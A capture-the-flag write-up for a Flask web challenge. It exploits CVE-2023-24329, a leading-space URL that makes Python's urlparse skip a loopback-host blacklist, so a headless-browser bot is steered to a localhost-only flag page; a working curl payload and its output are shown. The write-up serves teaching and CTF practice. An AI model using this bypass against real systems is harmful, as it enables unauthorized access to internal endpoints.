# Firebird Chan's Travel Guide

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 7 solves / 736 points
- Author: @vow
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Firebird Chan loves travelling around the Internet to collect Cookies!

Feel free to share your favourite links with Firebird Chan!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113150925.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113151219.png)

Hmm... Nothing weird in here. Let's read this web application's source code to understand what's going on.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chans-Travel-Guide/source.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Travel-Guide)-[2025.01.13|15:13:01(HKT)]
└> file source.zip 
source.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Travel-Guide)-[2025.01.13|15:13:02(HKT)]
└> unzip source.zip 
Archive:  source.zip
  inflating: Dockerfile              
  inflating: env/app.py              
  inflating: env/templates/flag.html  
  inflating: env/templates/index.html  
  inflating: env/templates/visit.html  
```

After a quick reading, we can have the following findings:
1. This web application is written in Python, with [Flask](https://flask.palletsprojects.com/en/stable/) web application framework
2. The POST route `/visit` simulates a user, which opens a new [headless Chrome browser](https://developer.chrome.com/blog/headless-chrome) and goes to our given URL

Let's dive deeper into the source code!

First off, what's our objective in this challenge? Where's the flag? Let's take a look at the GET route `/flag`:

```python
from flask import Flask, render_template, Response, request, abort, make_response
[...]
import jwt
[...]
FLAG = os.getenv("FLAG")
JWT_SECRET = os.urandom(32)
blacklist = ["127.0.0.1", "localhost", "0.0.0.0"]
[...]
@app.route('/flag', methods=['GET'])
def flag():
    try:
        if request.remote_addr == "127.0.0.1":
            if 'jwt' in request.cookies:
                data = jwt.decode(request.cookies.get('jwt'), JWT_SECRET, algorithms=["HS256"])
                if any(host in data['given_url'] for host in blacklist):
                    resp = make_response(render_template('flag.html', message="Flag"))
                    resp.set_cookie('cookie', FLAG)
                    return resp
        [...]
    except:
        abort(500)
```

In this route, if the request's client IP address is `127.0.0.1` (Loopback address), it'll try to verify, decode our JWT (JSON Web Token) from the request's cookie `jwt` using the [`decode`](https://pyjwt.readthedocs.io/en/stable/api.html#jwt.decode) function, and get claim `given_url` in the payload section. Then, it'll check the blacklisted hostnames (`blacklist`) with the `given_url` claim. **If the claim is NOT in the `blacklist`, it'll set a cookie named `cookie` with the value of the flag.**

With that said, we need to first bypass the request IP address `127.0.0.1` check, and then make sure our JWT claim `given_url` is not in the `blacklist`.

Huh, can we bypass that request IP address? Unfortunately, Flask's `request` object's `remote_addr` doesn't support request headers to overwrite the IP address by default. So, we can't use request header like `X-Forwarded-For` to bypass it.

But don't worry about that, we can actually use POST route `/visit` to make the request's IP address to be `127.0.0.1`:

```python
import urllib.parse
[...]
@app.route('/visit', methods=['POST'])
@limiter.limit('1 per 30 seconds')
def visit():
    [...]
    try:
        url = request.form.get('url')
        url_parsed = urllib.parse.urlparse(url)
        if any(host in url_parsed.netloc for host in blacklist):
            return render_template('visit.html', message="Don't visit my flag page >_<")
        else:
            [...]
    except:
        abort(500)
```

When we send a POST request with parameter `url` to this route, it calls function [`urlparse`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse) from library [`urllib.parse`](https://docs.python.org/3/library/urllib.parse.html#module-urllib.parse) and parses our `url` parameter's value. **If the parsed hostname (`netloc`) is IN the `blacklist`, it'll just return the `visit.html` HTML template.** So, our parsed `url` shouldn't be the value of the blacklisted hostnames.

```python
from selenium import webdriver
from selenium.common.exceptions import InvalidArgumentException, WebDriverException
[...]
@app.route('/visit', methods=['POST'])
@limiter.limit('1 per 30 seconds')
def visit():
    [...]
    try:
        [...]
        if any(host in url_parsed.netloc for host in blacklist):
            [...]
        else:
            try:
                # Just to prevent redirects :)
                encoded_jwt = jwt.encode({"given_url": url}, JWT_SECRET, algorithm="HS256")
                chrome_options = webdriver.ChromeOptions()
                [...]
                driver = webdriver.Chrome(options=chrome_options)
                driver.implicitly_wait(3)
                driver.get("http://127.0.0.1")
                driver.add_cookie({"name": "jwt", "value": encoded_jwt})
                driver.get(url)
                driver.set_page_load_timeout(3)	
                [...]
            except InvalidArgumentException:
                [...]
            except WebDriverException as e:
                [...]
            else:
                [...]
    except:
        abort(500)
```

After validating our parsed `url`, it'll launch a headless Chrome browser, go to `http://127.0.0.1`, set cookie `jwt` with the value of a signed JWT. In that JWT's payload section, it has claim `given_url` with our **original** POST parameter `url`'s value.

Right off the bat, I can already see a **dangerous code pattern**. In the JWT claim `given_url`, **instead using the parsed URL, it uses our parameter `url`**. Maybe we can leverage this **parser differential between the parsed hostname and POST parameter `url`** where the parsed hostname is NOT in the `blacklist` check and parameter `url` is in the `blacklist`.

```python
@app.route('/visit', methods=['POST'])
@limiter.limit('1 per 30 seconds')
def visit():
    collected_cookies = []
    try:
        [...]
        if any(host in url_parsed.netloc for host in blacklist):
            [...]
        else:
            try:
                [...]
                collected_cookies.append(driver.get_cookies())
                driver.quit()
            except InvalidArgumentException:
                [...]
            except WebDriverException as e:
                [...]
            else:
                return render_template('visit.html', message="Firebird Chan has visited your URL and brought back cookies!", cookie=collected_cookies)
    except:
        abort(500)
```

After the bot (headless Chrome browser) visited our `url` for 3 seconds, it'll get the bot's browser cookies and render HTML template `visit.html` with all the cookies.

`visit.html`:

```html
[...]
<span class="my-4 text-4xl font-bold break-all">{{cookie|safe}}</span><br>
```

To sum up briefly, we now need to find a **parser differential** between the parsed URL's hostname and our parameter `url` value.

According to `urllib.parse` documentation, section [URL parsing security](https://docs.python.org/3/library/urllib.parse.html#url-parsing-security), it said:

> The [`urlsplit()`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlsplit "urllib.parse.urlsplit") and [`urlparse()`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse "urllib.parse.urlparse") APIs do not perform **validation** of inputs. They may not raise errors on inputs that other applications consider invalid. They may also succeed on some inputs that might not be considered URLs elsewhere. Their purpose is for practical functionality rather than purity.
>  
> Instead of raising an exception on unusual input, they may instead return some component parts as empty strings. Or components may contain more than perhaps they should.

Hmm... Let's Google "Python `urllib.parse.urlparse` bypass" or something similar:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKUST-Firebird-CTF-Competition-2025/images/Pasted%20image%2020250113161358.png)

In the first result, we can find [this blog post](https://www.vicarius.io/vsociety/posts/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-4), which talks about CVE-2023-24329.

In Python version prior to **3.11.4**, `urllib.parse.urlparse` function will **return empty hostname** (`netloc`) if the **URL schema starts with a space character**:

```python
>>> import urllib.parse
>>> 
>>> urllib.parse.urlparse('http://127.0.0.1/')
ParseResult(scheme='http', netloc='127.0.0.1', path='/', params='', query='', fragment='')
>>> urllib.parse.urlparse(' http://127.0.0.1/')
ParseResult(scheme='', netloc='', path=' http://127.0.0.1/', params='', query='', fragment='')
```

Huh, interesting. Is the challenge using Python version <= 3.11.3?

`Dockerfile`:

```bash
FROM python:3.11.3-alpine3.18
[...]
```

Oh it is!

## Exploitation

Armed with the above information, we can get the flag via **sending a POST request to `/flag` with parameter `url= http://127.0.0.1/flag`**. By doing so, the parsed hostname will be an empty string, which passes the `blacklist` check. Then, the headless Chrome browser will go to ` http://127.0.0.1/flag`. After Chrome's URL normalization, the URL will be `http://127.0.0.1/flag`, which means the bot has the flag cookie, and the cookie will be rendered to us.

```shell
┌[siunam♥Mercury]-(~/ctf/HKUST-Firebird-CTF-Competition-2025/Web/Firebird-Chan's-Travel-Guide)-[2025.01.13|16:30:05(HKT)]
└> curl -X POST http://phoenix-chal.firebird.sh:36007/visit --data-urlencode 'url= http://127.0.0.1/flag'
[...]
            <span class="my-4 text-4xl font-bold break-all">[[{'domain': '127.0.0.1', 'httpOnly': False, 'name': 'cookie', 'path': '/', 'sameSite': 'Lax', 'secure': False, 'value': 'firebird{wow_CVE-2023-24329_challenge_very_cool_at_least_I_have_cookies_QAQ}'}, {'domain': '127.0.0.1', 'httpOnly': False, 'name': 'jwt', 'path': '/', 'sameSite': 'Lax', 'secure': False, 'value': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJnaXZlbl91cmwiOiIgaHR0cDovLzEyNy4wLjAuMS9mbGFnIn0.5Z8ApQybDZXaw6qgkgdAPga56chdoVLnDdGiOfibLL4'}]]</span><br>
[...]
```

- Flag: **`firebird{wow_CVE-2023-24329_challenge_very_cool_at_least_I_have_cookies_QAQ}`**

## Conclusion

What we've learned:

1. CVE-2023-24329 `urllib.parse.urlparse` parser differential